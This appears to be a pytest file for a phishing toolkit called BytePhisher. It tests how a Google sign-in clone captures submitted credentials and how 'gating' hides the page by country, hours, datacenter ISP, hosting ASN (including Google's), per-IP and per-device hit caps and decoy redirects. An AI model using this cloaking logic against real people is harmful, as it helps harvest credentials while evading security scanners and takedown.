"""BytePhisher campaign-gating tests (country / datacenter / hours / rate).

Run:  ./.venv/bin/python -m pytest tests/test_gate.py -v
"""
import os
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

import pytest
from conftest import TEMPLATES, free_port

from core import capture as cap
from core import server as srv
from core.gate import Gate, parse_days, parse_hours

# tier marker: the Makefile and pyproject document `pytest -m integration` (run_all.py ignores markers and runs every file)
pytestmark = pytest.mark.integration



# ============================================================ parsers ========
class TestParsers:
    def test_parse_days_shortnames_and_ranges(self):
        assert parse_days("mon") == {0}
        assert parse_days("mon,wed,fri") == {0, 2, 4}
        assert parse_days("mon-fri") == {0, 1, 2, 3, 4}
        assert parse_days("fri-mon") == {4, 5, 6, 0}     # Fri,Sat,Sun,Mon wrap-around
        assert parse_days("") is None
        # unparseable values RAISE: returning None used to disable the weekday
        # gate while the operator believed it was active (same contract as
        # parse_hours)
        with pytest.raises(ValueError):
            parse_days("bogus")
        with pytest.raises(ValueError):
            parse_days("mon,funday")

    def test_parse_hours(self):
        assert parse_hours("9-18") == (9 * 60, 18 * 60)          # minutes since midnight
        assert parse_hours("9:30-17:45") == (9 * 60 + 30, 17 * 60 + 45)
        assert parse_hours("0-24") == (0, 1440)                  # 24:00 = end of day
        assert parse_hours(None) is None
        # degenerate/unparseable values RAISE: silently returning None used to
        # disable the time gate while the operator believed it was active
        for bad in ("18-9", "9-9", "24-25", "junk", "9:", "-5"):
            with pytest.raises(ValueError):
                parse_hours(bad)


# ============================================================== gate =========
class TestGateLogic:
    def test_disabled_by_default(self):
        g = Gate()
        assert g.enabled is False
        assert g.check(ip="1.2.3.4", country="IN") == (True, "")

    def test_country_allow_list(self):
        g = Gate(allow_countries=["in", "US"])
        # the list is normalised to upper-case codes: a full country NAME is not
        # a code and must be refused, exactly like an unlisted country
        ok_name, reason_name = g.check(ip="1.1.1.1", country="India")
        assert ok_name is False and "not in allow list" in reason_name
        ok, reason = g.check(ip="1.1.1.1", country="IN")
        assert ok is True and reason == ""
        ok, reason = g.check(ip="1.1.1.1", country="DE")
        assert ok is False and "not in allow list" in reason
        ok, reason = g.check(ip="1.1.1.1", country="")
        assert ok is False and "unknown" in reason

    def test_country_block_list(self):
        g = Gate(block_countries=["RU", "CN"])
        assert g.check(ip="1.1.1.1", country="RU") == (False, "country RU is blocked")
        assert g.check(ip="1.1.1.1", country="IN")[0] is True

    def test_datacenter_refusal(self):
        g = Gate(block_datacenter=True)
        ok, reason = g.check(ip="1.1.1.1", isp="OVH SAS")
        assert ok is False and "datacenter" in reason
        ok, reason = g.check(ip="1.1.1.1", isp="Hetzner Online GmbH")
        assert ok is False
        assert g.check(ip="1.1.1.1", isp="Airtel Broadband")[0] is True

    def test_needs_geo_flags(self):
        assert Gate(block_datacenter=True).needs_geo is True
        assert Gate(allow_countries=["IN"]).needs_geo is True
        assert Gate(max_hits_per_ip=3).needs_geo is False
        assert Gate(active_hours="9-18").needs_geo is False

    def test_active_hours(self):
        g = Gate(active_hours="9-18")
        inside = time.mktime((2026, 10, 7, 11, 0, 0, 0, 0, -1))
        outside = time.mktime((2026, 10, 7, 23, 0, 0, 0, 0, -1))
        assert g.check(now=inside)[0] is True
        ok, reason = g.check(now=outside)
        assert ok is False and "active hours" in reason

    def test_active_days(self):
        g = Gate(active_days="mon-fri")
        monday = time.mktime((2026, 10, 5, 11, 0, 0, 0, 0, -1))    # Mon
        sunday = time.mktime((2026, 10, 11, 11, 0, 0, 0, 0, -1))   # Sun
        assert g.check(now=monday)[0] is True
        ok, reason = g.check(now=sunday)
        assert ok is False and "weekdays" in reason

    def test_hit_cap_sliding_window(self):
        g = Gate(max_hits_per_ip=3, window_seconds=60)
        for _ in range(3):
            assert g.check(ip="9.9.9.9")[0] is True
            g.note_hit("9.9.9.9")
        ok, reason = g.check(ip="9.9.9.9")
        assert ok is False and "hit cap" in reason
        assert g.hits("9.9.9.9") == 3
        # another IP is unaffected
        assert g.check(ip="8.8.8.8")[0] is True
        # window expiry frees the cap again
        assert g.check(ip="9.9.9.9", now=time.time() + 120)[0] is True

    def test_active_hours_boundary_minutes(self):
        """08:59 blocked, 09:00 served, 17:59 served, 18:00 blocked."""
        g = Gate(active_hours="9-18")

        def at(h, m):
            return time.mktime(time.strptime(f"2026-10-08 {h:02d}:{m:02d}:00",
                                             "%Y-%m-%d %H:%M:%S"))

        assert g.check(country="IN", now=at(8, 59))[0] is False
        assert g.check(country="IN", now=at(9, 0))[0] is True
        assert g.check(country="IN", now=at(17, 59))[0] is True
        assert g.check(country="IN", now=at(18, 0))[0] is False

    def test_minute_precision_window(self):
        g = Gate(active_hours="9:30-17:45")

        def at(h, m):
            return time.mktime(time.strptime(f"2026-10-08 {h:02d}:{m:02d}:00",
                                             "%Y-%m-%d %H:%M:%S"))

        assert g.check(country="IN", now=at(9, 29))[0] is False
        assert g.check(country="IN", now=at(9, 30))[0] is True
        assert g.check(country="IN", now=at(17, 44))[0] is True
        assert g.check(country="IN", now=at(17, 45))[0] is False

    def test_degenerate_hours_refuse_to_silently_disable(self):
        with pytest.raises(ValueError):
            Gate(active_hours="9-9")
        with pytest.raises(ValueError):
            Gate(active_hours="18-9")

    def test_describe_is_human_readable(self):
        g = Gate(allow_countries=["IN"], block_datacenter=True,
                 active_hours="9-18", max_hits_per_ip=5)
        d = g.describe()
        for bit in ("allow IN", "no-datacenter", "hours 09:00-18:00", "cap 5"):
            assert bit in d, d


# ======================================================= gate over HTTP ======
class GatedServer:
    def __init__(self, gate, geo="off", decoy=""):
        self.db_path = os.path.join(tempfile.mkdtemp(prefix="bp_gate_"), "g.db")
        self.port = free_port()
        self.db = cap.CaptureDB(self.db_path)
        self.httpd, _ = srv.serve(TEMPLATES, os.path.join(TEMPLATES, "03_google"),
                                  self.port, self.db_path, geo_provider=geo,
                                  gate=gate, decoy_url=decoy, campaign="gated")
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        time.sleep(0.3)

    def get(self, headers=None):
        req = urllib.request.Request(f"http://127.0.0.1:{self.port}/", headers=headers or {})
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status, r.read().decode("utf-8", "replace"), dict(r.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace"), dict(e.headers)

    def post(self, data, headers=None):
        h = {"Content-Type": "application/x-www-form-urlencoded"}
        h.update(headers or {})
        req = urllib.request.Request(f"http://127.0.0.1:{self.port}/",
                                     data=urllib.parse.urlencode(data).encode(), headers=h)
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status
        except urllib.error.HTTPError as e:
            return e.code

    def stop(self):
        try:
            self.httpd.shutdown()
        finally:
            self.db.close()


class TestGateOverHTTP:
    def test_allowed_visitor_gets_page_and_capture(self):
        s = GatedServer(Gate(active_hours="0-24"))
        try:
            status, body, _ = s.get()
            # the template follows Google's real layout: the heading is "Sign in"
            # and the brand rides in the title, the logo and the footer
            assert status == 200 and "Sign in" in body and "Google" in body
            assert s.post({"email": "ok@example.com", "password": "x"}) == 200
            time.sleep(0.3)
            assert s.db.stats()["total_captures"] == 1
            assert s.db.blocked_stats()["total_blocked"] == 0
        finally:
            s.stop()

    def test_gated_visitor_gets_inert_page_and_is_logged(self):
        # a range that cannot contain the current hour
        now_hour = time.localtime().tm_hour
        window = "0-1" if now_hour >= 2 else "22-24"
        s = GatedServer(Gate(active_hours=window))
        try:
            status, body, _ = s.get()
            assert status == 503, status
            assert "no longer active" in body
            assert "Log in to Google" not in body
            assert s.post({"email": "blocked@example.com", "password": "x"}) == 503
            time.sleep(0.3)
            assert s.db.stats()["total_captures"] == 0        # nothing captured
            bs = s.db.blocked_stats()
            assert bs["total_blocked"] >= 1
            assert any("active hours" in b["reason"] for b in bs["by_reason"])
        finally:
            s.stop()

    def test_gated_visitor_can_be_sent_to_decoy(self):
        now_hour = time.localtime().tm_hour
        window = "0-1" if now_hour >= 2 else "22-24"
        s = GatedServer(Gate(active_hours=window), decoy="https://real.example.com/login")
        try:
            req = urllib.request.Request(f"http://127.0.0.1:{s.port}/")
            class _NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *a, **kw):
                    return None
            try:
                r = urllib.request.build_opener(_NoRedirect).open(req, timeout=10)
                status, loc = r.status, r.headers.get("Location")
            except urllib.error.HTTPError as e:
                status, loc = e.code, e.headers.get("Location")
            assert status == 302 and loc == "https://real.example.com/login"
        finally:
            s.stop()

    def test_hit_cap_blocks_after_n_requests(self):
        s = GatedServer(Gate(max_hits_per_ip=2, window_seconds=3600))
        try:
            assert s.get()[0] == 200
            assert s.get()[0] == 200
            status, body, _ = s.get()
            assert status == 503, f"expected the third hit to be capped, got {status}"
            bs = s.db.blocked_stats()
            assert any("hit cap" in b["reason"] for b in bs["by_reason"]), bs
        finally:
            s.stop()

    def test_datacenter_rule_fails_open_without_geo(self):
        """With --geo off there is no ISP data: an allow-list still blocks
        (nothing proves the country), but a datacenter *filter* fails open —
        can't prove it is a datacenter, so the visitor is served."""
        s = GatedServer(Gate(block_datacenter=True), geo="off")
        try:
            assert s.get()[0] == 200                  # fails open, by design
            assert s.db.blocked_stats()["total_blocked"] == 0
        finally:
            s.stop()

    def test_country_allow_list_blocks_without_geo(self):
        s = GatedServer(Gate(allow_countries=["IN"]), geo="off")
        try:
            status, _, _ = s.get()
            assert status == 503                      # cannot prove the country
            bs = s.db.blocked_stats()
            assert any("not in allow list" in b["reason"] for b in bs["by_reason"])
        finally:
            s.stop()

    def test_gate_does_not_count_refused_visitors(self):
        s = GatedServer(Gate(max_hits_per_ip=1, window_seconds=3600))
        try:
            assert s.get()[0] == 200
            assert s.get()[0] == 503                 # refused
            time.sleep(0.2)
            st = s.db.stats()
            assert st["visitors"] == 1               # only the served visitor
        finally:
            s.stop()


# ======================================================= reporting ==========
class TestGatingReporting:
    def test_blocked_stats_grouping(self):
        db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(), "b.db"))
        db.log_blocked("1.1.1.1", "RU", "country RU is blocked")
        db.log_blocked("2.2.2.2", "RU", "country RU is blocked")
        db.log_blocked("3.3.3.3", "US", "datacenter network (OVH SAS)")
        bs = db.blocked_stats()
        assert bs["total_blocked"] == 3
        assert bs["by_reason"][0] == {"reason": "country RU is blocked", "count": 2}
        db.close()



class TestHitMapIsBounded:
    """The per-IP map is keyed by a value a client can spoof, so it must not grow
    without bound. A mutation audit showed this rule was only asserted from the
    security suite; it belongs here, next to the rest of the gate's behaviour."""

    def test_the_map_is_capped(self):
        g = Gate(max_hits_per_ip=3, window_seconds=60)
        for i in range(g.MAX_HIT_IPS + 200):
            g.note_hit(f"10.{i // 256}.{i % 256}.1")
        assert len(g._hits) <= g.MAX_HIT_IPS, len(g._hits)

    def test_empty_keys_are_pruned(self):
        g = Gate(max_hits_per_ip=3, window_seconds=60)
        g.note_hit("1.2.3.4", now=time.time() - 3600)      # outside the window
        assert not [k for k, v in g._hits.items() if not v], g._hits

    def test_the_cap_keeps_counting_hits_for_a_live_visitor(self):
        g = Gate(max_hits_per_ip=2, window_seconds=60)
        for i in range(g.MAX_HIT_IPS + 50):
            g.note_hit(f"10.{i // 256}.{i % 256}.1")
        g.note_hit("127.0.0.1")
        g.note_hit("127.0.0.1")
        assert g.hits("127.0.0.1") >= 2, "the cap must not break counting"


class TestAsnRules:
    """An ASN is a better filter than the ISP string: `--block-datacenter` matches text,
    while a hosting ASN is a fact. A NAT'd office and a mobile target both break the
    per-IP cap, which is why the device cap exists."""

    def test_a_blocked_asn_is_refused_in_any_spelling(self):
        for spelling in ("15169", "AS15169", "as15169", " AS15169 "):
            g = Gate(block_asn=["AS15169"])
            ok, why = g.check(ip="1.1.1.1", asn=spelling)
            assert not ok and "15169" in why, (spelling, ok, why)

    def test_another_asn_is_served(self):
        g = Gate(block_asn=["15169"])
        assert g.check(ip="1.1.1.1", asn="64500")[0] is True

    def test_an_allow_list_fails_closed_without_asn_data(self):
        g = Gate(allow_asn=["15169"])
        assert g.check(ip="1.1.1.1", asn="AS15169")[0] is True
        assert g.check(ip="1.1.1.1", asn="64500")[0] is False
        ok, why = g.check(ip="1.1.1.1", asn="")
        assert ok is False and "unknown" in why

    def test_a_non_numeric_asn_is_ignored_rather_than_matching(self):
        # a junk value must not silently block (or silently allow) everyone
        g = Gate(block_asn=["AS15169"])
        assert g.check(ip="1.1.1.1", asn="not-an-asn")[0] is True
        g2 = Gate(block_asn=["nonsense"])
        assert g2.check(ip="1.1.1.1", asn="15169")[0] is True

    def test_the_asn_rules_are_reported(self):
        text = Gate(block_asn=["15169"], allow_asn=["64500"]).describe()
        assert "15169" in text and "64500" in text


class TestThePerDeviceCap:

    def test_the_cap_follows_the_device_not_the_address(self):
        g = Gate(max_hits_per_device=3, window_seconds=3600)
        for i in range(3):
            over, count = g.device_capped("dev-1", now=1000 + i)
            assert not over, (i, count)
            g.note_device_hit("dev-1", now=1000 + i)
        over, count = g.device_capped("dev-1", now=1004)
        assert over and count == 3
        # a different device behind the same address is unaffected
        assert g.device_capped("dev-2", now=1004)[0] is False

    def test_the_window_expires(self):
        g = Gate(max_hits_per_device=2, window_seconds=60)
        g.note_device_hit("dev-1", now=1000)
        g.note_device_hit("dev-1", now=1001)
        assert g.device_capped("dev-1", now=1002)[0] is True
        assert g.device_capped("dev-1", now=1100)[0] is False

    def test_a_stored_count_seeds_the_cap(self):
        # after a restart the in-memory window is empty; the store's count must count
        g = Gate(max_hits_per_device=5, window_seconds=3600)
        over, count = g.device_capped("dev-1", extra=5, now=1000)
        assert over and count == 5

    def test_no_cap_means_no_capping(self):
        g = Gate()
        g.note_device_hit("dev-1")
        assert g.device_capped("dev-1")[0] is False

    def test_an_empty_token_never_caps(self):
        g = Gate(max_hits_per_device=1)
        g.note_device_hit("")
        assert g.device_capped("")[0] is False

    def test_the_device_map_is_bounded(self):
        g = Gate(max_hits_per_device=2, window_seconds=3600)
        for i in range(g.MAX_DEVICES + 50):
            g.note_device_hit(f"dev-{i}")
        g.note_device_hit("dev-live")
        assert len(g._device_hits) <= g.MAX_DEVICES + 1
        assert g.device_hits("dev-live") >= 1
